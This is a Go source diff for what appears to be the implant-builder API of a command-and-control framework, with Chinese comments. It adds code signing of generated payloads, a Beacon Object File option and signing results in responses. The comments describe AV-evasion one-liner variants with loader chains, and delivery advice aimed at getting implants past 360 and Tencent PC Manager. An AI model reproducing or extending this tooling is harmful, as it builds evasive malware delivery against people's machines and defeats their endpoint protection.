@@ -71,6 +71,23 @@ func (s *Server) listBuildersHandler(w http.ResponseWriter, r *http.Request) {
 			"garble_available": garbleAvail,
 			"garble_message":   garbleMsg,
 			"upx_available":    upxAvail,
+			// 代码签名能力（是否已配置证书、用的哪套签名栈），供生成载荷页展示与提示
+			"sign_configured": func() bool {
+				if s.builder == nil {
+					return false
+				}
+				ok, _ := s.builder.SignStatus()
+				return ok
+			}(),
+			"sign_message": func() string {
+				if s.builder == nil {
+					return ""
+				}
+				_, msg := s.builder.SignStatus()
+				return msg
+			}(),
+			// BOF 默认关闭：需要跑 BOF 时在页面上勾选（会带上一整套 Beacon* API 名字）
+			"bof_default": false,
 		},
 	})
 }
@@ -166,6 +183,8 @@ func (s *Server) createBuilderHandler(w http.ResponseWriter, r *http.Request) {
 		GarbleEnable: req.GarbleEnable,
 		UPXEnable:    req.UPXEnable,
 		EvasionScan:  req.EvasionScan,
+		BofEnabled:   req.BofEnabled,
+		SignEnabled:  req.SignEnabled,
 		// 启动随机延迟：0 = 交给 builder 取服务端配置 / 内置默认
 		StartDelayMin: req.StartupDelayMin,
 		StartDelayMax: req.StartupDelayMax,
@@ -204,8 +223,16 @@ func (s *Server) createBuilderHandler(w http.ResponseWriter, r *http.Request) {
 		BuildTime:   result.BuildTime.Format(time.RFC3339),
 		DownloadURL: fmt.Sprintf("/api/v1/implants/stored/%s", buildID),
 	}
+	// 代码签名结果：把"签没签上、谁签的、为什么没签"如实带回给前端与调用方
+	if result.Sign != nil {
+		response.Signed = result.Sign.Signed
+		response.Signer = result.Sign.Signer
+		response.SignMethod = result.Sign.Method
+		response.SignStatus = result.Sign.Status
+		response.SignMessage = result.Sign.Message
+	}
 	// 一键上线命令：地址由服务端按目标机可达性解析（见 oneliner.go），
-	// 并一次性给出多套免杀变体，前端只负责展示。
+	// 并一次性给出多套免杀变体（含加载器链），前端只负责展示。
 	if set := s.oneLinerSet(r, req.ServerURL, req.OS, req.Format, buildID, req.DownloadHost); set != nil {
 		response.OneLinerHost = set.Host
 		response.OneLinerBase = set.BaseURL
@@ -215,6 +242,16 @@ func (s *Server) createBuilderHandler(w http.ResponseWriter, r *http.Request) {
 			response.OneLiner = set.Variants[0].Command
 		}
 	}
+
+	// 落地链建议：按平台/格式 + 本次产物是否已签名，给出"该走哪条链、为什么"。
+	// 依据是实测结论：未签名的新 PE 在装有 360/电脑管家的主机上会被拒绝执行并删除。
+	targetOS := req.OS
+	if targetOS == "" {
+		targetOS = "windows"
+	}
+	adviceTitle, adviceTips := LoaderAdvice(targetOS, req.Format, response.Signed)
+	response.LoaderAdviceTitle = adviceTitle
+	response.LoaderAdviceTips = adviceTips
 
 	implantDir := s.cfg.Implant.OutputDir
 	if implantDir == "" {
